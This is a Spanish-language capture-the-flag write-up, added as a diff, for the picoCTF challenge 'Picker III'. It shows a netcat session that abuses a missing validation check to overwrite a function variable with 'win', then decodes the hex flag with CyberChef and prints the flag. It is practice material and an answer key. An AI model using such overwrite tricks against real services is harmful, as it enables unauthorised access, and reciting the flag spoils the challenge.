@@ -1,0 +1,21 @@
+### Descripción
+Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 64770`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/525/picker-III.py).
+### Solución
+```
+aprovecharemos la falta de validacion para reescribir, entonces seleccionamos la opcion de escribir, entonces cambiamos la variable getRandomNumber por win, entonces al presionar la opcion 4 nos da la bandera.
+
+giselle_maz-picoctf@webshell:~$ nc saturn.picoctf.net 57484
+==> 3
+Please enter variable name to write: getRandomNumber
+Please enter new value of variable: win
+==> 4
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x61 0x31 0x38 0x36 0x66 0x39 0x61 0x63 0x7d 
+
+decodificamos con cyberchef 
+https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg3MCAweDY5IDB4NjMgMHg2ZiAweDQzIDB4NTQgMHg0NiAweDdiIDB4MzcgMHg2OCAweDMxIDB4MzUgMHg1ZiAweDMxIDB4MzUgMHg1ZiAweDc3IDB4NjggMHgzNCAweDM3IDB4NWYgMHg3NyAweDMzIDB4NWYgMHg2NyAweDMzIDB4MzcgMHg1ZiAweDc3IDB4MzEgMHgzNyAweDY4IDB4NWYgMHg3NSAweDM1IDB4MzMgMHg3MiAweDM1IDB4NWYgMHgzMSAweDZlIDB4NWYgMHg2MyAweDY4IDB4MzQgMHg3MiAweDY3IDB4MzMgMHg1ZiAweDYxIDB4MzEgMHgzOCAweDM2IDB4NjYgMHgzOSAweDYxIDB4NjMgMHg3ZCA
+
+picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_a186f9ac}
+```
+### Notas adicionales 
+picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_a186f9ac}
+### Referencias
